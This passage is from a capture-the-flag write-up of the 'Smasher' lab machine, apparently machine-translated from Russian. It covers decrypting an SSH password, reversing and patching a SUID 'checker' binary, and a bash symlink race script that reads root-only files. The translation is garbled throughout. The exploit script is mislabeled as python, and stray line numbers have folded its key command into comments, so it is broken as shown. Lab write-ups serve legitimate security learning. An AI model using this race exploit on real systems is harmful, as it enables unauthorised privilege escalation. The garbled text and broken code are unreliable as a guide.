Now, having received the secret key `Th1sCh4llang31SInsane!!!`, I can verify that the message was decrypted correctly.


```bash
>>> import base64
>>> from Crypto.Cipher import AES
>>> key = 'Th1sCh4llang31SInsane!!!'
>>> ciphertext = 'irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg=='
>>> AES.new(key, AES.MODE_CBC, "\x00"*16).decrypt(base64.b64decode(ciphertext))
"SSH password for user 'smasher' is: PaddingOracleMaster123\x06\x06\x06\x06\x06\x06"
```

# PrivEsc: smasher → root

Okay, it's time to wake up to root. This mysterious binar will help us with this `/usr/bin/checker`.

Let's see what he can do. First, I will run `checker` as `www`.

```bash
www@smasher:~$ checker
You're not 'smasher' user please level up bro!
```

He wants to run only on behalf of `smasher`. Okay, so be it.

```bash
www@smasher:~$ su - smasher
Password: PaddingOracleMaster123
smasher@smasher:~$ checker
[+] Welcome to file UID checker 0.1 by dzonerzy

Missing arguments
```

Now the argument is missing.

```bash
smasher@smasher:~$ checker snovvcrash
[+] Welcome to file UID checker 0.1 by dzonerzy

File does not exist!
```

More specifically, it `checker` waits for a file to enter.

```bash
smasher@smasher:~$ echo 'TESTING...' > test.txt
smasher@smasher:~$ checker test.txt
[+] Welcome to file UID checker 0.1 by dzonerzy

File UID: 1001

Data:
TESTING...
```

Everything starts to make sense ... After some `freeze` (about a second) I `checker` concluded: the `UID` of the file owner is `1001`. It is obvious that the user smasher is listed under the 1001st number in the system.

```bash
smasher@smasher:~$ ls -la test.txt
-rw-rw-r-- 1 smasher smasher 11 Nov  9 21:07 test.txt
smasher@smasher:~$ id
uid=1001(smasher) gid=1001(smasher) groups=1001(smasher)
```

Something else interesting.

```bash
smasher@smasher:~$ checker /usr/bin/checker
[+] Welcome to file UID checker 0.1 by dzonerzy

File UID: 0

Data:
ELF
```

If we ask the executable file to check itself, then in response we get that the `UID` is ` 0`. It is logical: we have access to the file, but its owner is root.

```bash
smasher@smasher:~$ checker /etc/shadow
[+] Welcome to file UID checker 0.1 by dzonerzy

Access failed , you don't have permission!
```

Attempting to open a file that we do not have access to will result in a message `Access failed` , you `don't` have `permission!`.

```bash
smasher@smasher:~$ checker /etc/passwd
[+] Welcome to file UID checker 0.1 by dzonerzy

Segmentation fault
```

Finally, if you transfer a larger file, it `checker` will crash with a segmentation fault.

Well, it's time for a little reverse task.

## Checker analysis

Let's transfer the binar to Kali with the help `nc` for further analysis.

[![nc-transfer.png](/assets/img/posts/smasher/nc-transfer.png)](/assets/img/posts/smasher/nc-transfer.png)
{:.center-image}

### Play reverse engineers

In the last article we [использовали](https://snovvcrash.github.io/2019/11/23/bitterman.html#статический-анализ)Ghidra as an alternative to IDA Pro, and a separate  [статья](https://xakep.ru/2019/03/20/nsa-ghidra/), devoted to comparing these tools was published on Hacker. The main feature of "Hydra" is that it provides an open source (unlike any other IDA and Hopper) plugin-decompiler for generating pseudocode - and this greatly facilitates the reverse process. Today we'll look at another way to use this plugin.
In lettest [Cutter](https://github.com/radareorg/cutter/releases/tag/v1.9.0) - the graphical shell of the legendary Radare2 - has got a hydraulic module for decompilation right out of the box
The Decompiler tab has appeared in the main program window - it is just responsible for displaying information from the plugin `r2ghidra-dec`.

[![cutter-decompiler.png](/assets/img/posts/smasher/cutter-decompiler.png)](/assets/img/posts/smasher/cutter-decompiler.png)
{:.center-image}

And, of course, there is a familiar graph representation here.

[![cutter-graph.png](/assets/img/posts/smasher/cutter-graph.png)](/assets/img/posts/smasher/cutter-graph.png)
{:.center-image}

This is what I got after some cosmetic changes to the function `pseudocode` `main`.



```c
// checker-main.c

int main(int argc, char **argv) {
    if (getuid() == 0x3e9) {
        puts("[+] Welcome to file UID checker 0.1 by dzonerzy\n");

        if (argc < 2) {
            puts("Missing arguments");
        }

        else {
            filename = argv[1];
            buf_stat = malloc(0x90);

            if (stat(filename, buf_stat) == 0) {
                if (access(filename, 4) == 0) {
                    char file_contents[520];

                    setuid(0);
                    setgid(0);
                    sleep(1);
                    strcpy(file_contents, ReadFile(arg1));
                    printf("File UID: %d\n", (uint64_t)*(uint32_t *)((int64_t)buf_stat + 0x1c));
                    printf("\nData:\n%s", (int64_t)&file_contents + 4);
                } else {
                    puts("Acess failed , you don\'t have permission!");
                }
            } else {
                puts("File does not exist!");
            }
        }
        rax = 0;
    } else {
        sym.imp.puts("You\'re not \'smasher\' user please level up bro!");
        rax = 0xffffffff;
    }
    return rax;
}
```

From here you can get an almost complete picture of how it works`checker`:

1. Checking the real user ID (function getuid). If it is equal 1001(or 0x3e9in hexadecimal form), then the execution continues, otherwise - displays a message about the need for level-up and exit.
2. Checking the number of arguments passed. If there are more than one of them, then the execution continues, otherwise it displays a message about the lack of arguments and exits.
3. Checking the existence of the file passed in the first argument. If it exists, execution continues, otherwise it displays a message about the absence of such a file and exits.
4. Checking access to read the file from the owner of the process. If the user who started checkerit can read the file, then execution continues, otherwise it displays a message about a lack of privileges and exits.
5. If all checks are passed, then:
    - a buffer `file_contentsof 520 bytes` is created on the stack ;
    - functions are called `setuidand` `setgid`(they ensure that the file we have initial access to is read as root);
    - buffer `file_contentsvia` unsafe function `strcpy` copies the result of third-party functions `ReadFile`;
    - going to sleep for one second (the same delay that I initially took for the `"freeze"` of the program);
    - displaying messages containing the `UID` of the owner of the file and the insides of that same file.

What conclusions can be drawn from the analysis?

First, this file also has a stack overflow vulnerability, because the code uses `strcpy`- and it copies the contents of the file into a static buffer on the stack. By the way, this is what the function of reading the contents of a file looks like `ReadFile`.

```c
// checker-ReadFile.c

int64_t sym.ReadFile(char *arg1)
{
    int32_t iVar1;
    int32_t iVar2;
    int64_t iVar3;
    int64_t ptr;
    
    ptr = 0;
    iVar3 = sym.imp.fopen(arg1, 0x400c68);
    if (iVar3 != 0) {
        sym.imp.fseek(iVar3, 0, 2);
        iVar1 = sym.imp.ftell(iVar3);
        sym.imp.rewind(iVar3);
        ptr = sym.imp.malloc((int64_t)(iVar1 + 1));
        iVar2 = sym.imp.fread(ptr, 1, (int64_t)iVar1, iVar3);
        *(undefined *)(ptr + iVar1) = 0;
        if (iVar1 != iVar2) {
            sym.imp.free(ptr);
            ptr = 0;
        }
        sym.imp.fclose(iVar3);
    }
    return ptr;
}
```

Everything is quite `simple here`: the file is opened, the necessary amount of `memory` is `allocated` to fit the entire contents, then the data is read and the pointer to the area where the file contents was loaded is returned.

Secondly, we have the ability to conduct a timing attack. There if `(access(filename, 4) == 0)`is a one second window between checking access to the specified file `( )` and reading the content itself. This means that we can manage to replace the file with any other (even the one to which we do not have access) - and it will still be read, because by this moment it checkerhas already received the `SUID` bit ( `setuid(0)`; `setgid(0)`).

Let's implement this attack to read the root flag, but first we will find out if we can break the stack on execution `strcpy`.


#### Strace


```bash
root@kali:~# strace ./checker checker 
execve("./checker", ["./checker", "checker"], 0x7fff857edf88 /* 47 vars */) = 0
...
getuid()                                = 0
...
write(1, "[+] Welcome to file UID checker "..., 48[+] Welcome to file UID checker 0.1 by dzonerzy
...
stat("checker", {st_mode=S_IFREG|0750, st_size=13617, ...}) = 0
access("checker", R_OK)                 = 0
setuid(0)                               = 0
setgid(0)                               = 0
nanosleep({tv_sec=1, tv_nsec=0}, 0x7fff72ad99c0) = 0
openat(AT_FDCWD, "checker", O_RDONLY)   = 3
...
lseek(3, 12288, SEEK_SET)               = 12288
read(3, "\240\5@\0\0\0\0\0\240\5\0\0\0\0\0\0\260\1\0\0\0\0\0\0\5\0\0\0\30\0\0\0"..., 1329) = 1329
lseek(3, 0, SEEK_SET)                   = 0
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\2\0>\0\1\0\0\0\260\10@\0\0\0\0\0"..., 12288) = 12288
read(3, "\240\5@\0\0\0\0\0\240\5\0\0\0\0\0\0\260\1\0\0\0\0\0\0\5\0\0\0\30\0\0\0"..., 4096) = 1329
close(3)                                = 0
write(1, "File UID: 0\n", 12File UID: 0
...
write(1, "\nData:\n", 7
...
write(1, "\177ELF\2\1\1", 7ELF)            = 7
exit_group(0)                           = ?
+++ exited with 0 +++
```

s you can see, the result almost completely reflects the text flowchart that we sketched after analysis in `Cutter`.

### Bypassing UID startup restrictions

Since the program can only be successfully used by a user with UID 1001, we will not be able to just run it on our `machine`. To open `checker`in a `debugger`, you need to ` bypass` this limitation. Several ways come to mind at once.

The first option is to create a user named `smasher` with the desired sequence number on `Kali`.

```bash
root@kali:~# useradd -u 1001 -m smasher
root@kali:~# smasher su smasher
$ python -c 'import pty; pty.spawn("/bin/bash")'
smasher@kali:/root/htb/boxes/smasher$ whoami
smasher
```

After that I can run `checker`.

```bash
smasher@kali:/root/htb/boxes/smasher$ ./checker
[+] Welcome to file UID checker 0.1 by dzonerzy

Missing arguments
```

The second option is to patch the binar. To do this, we will find the machine representation of the instruction that is responsible for checking the `UID` (by the location of the number `0x3e9`).

```bash
root@kali:~# objdump -D checker | grep -A1 -B1 0x3e9
400a93:       e8 38 fd ff ff          callq  4007d0 <getuid@plt>
400a98:       3d e9 03 00 00          cmp    $0x3e9,%eax
400a9d:       74 14                   je     400ab3 <main+0x38>
```

Replace `0x3e9` with `0x0` to run checkeras root. This can be done both with console utilities (the same omnipotent `vi`) and `graphical` (for example `ghex`). I will focus on the first method.

```bash
root@kali:~# vim checker
(vim) :% !xxd
(vim) /3de9
(vim) Enter + i
3de9030000 => 9083F80090
(vim) Escape
(vim) :w
(vim) :% !xxd -r
(vim) :wq
root@kali:~# ./checker checker
...
```

[![checker-patch.gif](/assets/img/posts/smasher/checker-patch.gif))](/assets/img/posts/smasher/checker-patch.gif)

I replaced the machine code 3d e9 03 00 00responsible for the instruction cmp eax,0x3e9 with 90 83 F8 00 90- which is equivalent cmp eax,0x0to NOP ( 0x90) instructions extended to their original length . You can assemble mnemonics into opcode (and vice versa) using [Ropper](https://github.com/sashs/Ropper) And [онлайн](https://defuse.ca/online-x86-assembler.htm).

### Is a stack break possible?

`checker` Let's open `PEDA` in `GDB` and try to overwrite RIP. To do this, I will generate a `1000` byte pattern, save it to a file `p.txt` and send it to the `checker` as input.

```bash
gdb-peda$ pattern create 1000 p.txt
Writing pattern of 1000 chars to filename "p.txt"
gdb-peda$ r p.txt
...
```

The program fell as expected. Let's see the contents of the `RSP register`.

```bash
gdb-peda$ x/xg $rsp
0x7fffffffde40: 0x00007fffffffe158
```
The `RSP` contains a pointer. If we go further and look at the contents of the pointer, we find part of our `looping sequence`.

```bash
gdb-peda$ x/xs 0x00007fffffffe158
0x7fffffffe158: "BWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$t"...
gdb-peda$ pattern offset BWABuABXABv
BWABuABXABv found at offset: 776
```

Due to the fact that the RSP does not save the contents of the file itself, but a pointer to it, I did not manage to get control over the RIP. I'm not sure if this is possible in principle, so let's take the path of least resistance and switch to timing attack.


## Race for root.txt

The strategy is outrageously simple:


- create a `fake` file that we can `obviously read`;
- create a `symbolic` link pointing to it;

- `asynchronously` (in a fork of the main shell process) we feed the file to the `checker` ;

- wait half a second to get to the second of `"waiting"` ;

- replace the symbolic link to any other file (just not too big, so as not to catch a segmentation fault).

```python
#!/bin/bash

# # Usage: bash checker-exploit.sh <FILE>

# We create an empty file, which will be our "cover" 1132 touch .fake
touch .fake

# We create a link - a symbolic link to .fake, which we will change further
ln -s .fake .pivot

# In the background, launch the checker and wait half a second to get into the second delay window 1138 checker .pivot &
sleep 0.5

# Replace the symbolic link to another file passed to the script in the first argument
ln -sf $1 .pivot

# We wait another half a second and clean the tracks
sleep 0.5
rm .fake .pivot
```

```bash
smasher@smasher:~$ ./checker-exploit.sh /root/root.txt
[+] Welcome to file UID checker 0.1 by dzonerzy

File UID: 1001

Data:
077af136dfgfxdgfxdcxczdgshk
```

That's all: The Crusher is defeated, we have the root flag!

![trophy.png](/assets/img/posts/smasher/trophy.png)
{:.center-image}





# Epilogue

## Analysis of tiny.c with PVS-Studio

When I found a `vulnerability` in the source code `tiny.c`, I got a strange idea: to see what the static analyzer has to say about the quality of the code and possible problems with it. Previously, I only worked with [PVS-Studio](https://ru.wikipedia.org/wiki/PVS-Studio) from domestic developers - it was with them that I decided to satisfy my curiosity. I'm not completely sure what exactly I expected to see in the report, because the stack overflow is not obvious here. "Unsafe" functions are not directly to blame for it - and it is strange to expect that the analyzer will find danger in a function call or implementation `url_decode`. But I was still interested.

I downloaded and installed PVS-Studio on Kali.

```bash
root@kali:~# wget -q -O - https://files.viva64.com/etc/pubkey.txt | sudo apt-key add -
root@kali:~# sudo wget -O /etc/apt/sources.list.d/viva64.list https://files.viva64.com/etc/viva64.list
root@kali:~# sudo apt update
root@kali:~# sudo apt install pvs-studio -y
```
Then he added two lines to the beginning of the source code `tiny.c`, as shown on the official website of the program, to activate the academic license.

```c
// This is a personal academic project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com
```

I am Hacker, so I am clear before my conscience and the law.
Then I commented out two more lines in tiny.c- so that GCC doesn't complain that it doesn't know about the directive SO_REUSEPORT([issue](https://stackoverflow.com/a/14388707) portability).

```c
// if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEPORT, (const char*)&reuse, sizeof(reuse)) < 0) 
//  perror("setsockopt(SO_REUSEPORT) failed");
```

Now I can build the project using `make` PVS-Studio tracing (by the way, here is implicitly used already familiar to us `strace`).

```bash
pvs-studio-analyzer trace -- make
```

The command has created a file `strace_out`- it contains the trace results and will be used in the next step.

We analyze the build process using `analyze`, specifying the name of the output file through the flag `-o`.

```bash
pvs-studio-analyzer analyze -o project.log
Using tracing file: strace_out
[100%] Analyzing: tiny.c
Analysis finished in 0:00:00.28
The results are saved to /root/htb/boxes/smasher/pvs-tiny/project.log
```

Finally, ask the static analyzer to generate an extended final `HTML` report.

```bash
plog-converter -a GA:1,2 -t fullhtml project.log -o .
Analyzer log conversion tool.
Copyright (c) 2008-2019 OOO "Program Verification Systems"

PVS-Studio is a static code analyzer and SAST (static application security
testing) tool that is available for C and C++ desktop and embedded development,
C# and Java under Windows, Linux and macOS.

Total messages: 16
Filtered messages: 13
```

Now I can open `fullhtml/index.html` to view the report.

![](/assets/img/posts/smasher/pvs-studio-main.png)

Most of the analyzer's worries are associated with `theoretical` overflows when using functions sscanfand `sprintf-` in our case, they can be attributed to false positives. However, `PVS-Studio``parse_requestd`id not complain about anything else in the implementation .

![pvs-studio-tiny.png](/assets/img/posts/smasher/pvs-studio-tiny.png)](/assets/img/posts/smasher/pvs-studio-tiny.png)
{:.center-image}

`What does this mean?`The fact that`code` verification is still difficult to automate - even in `modern technology`.
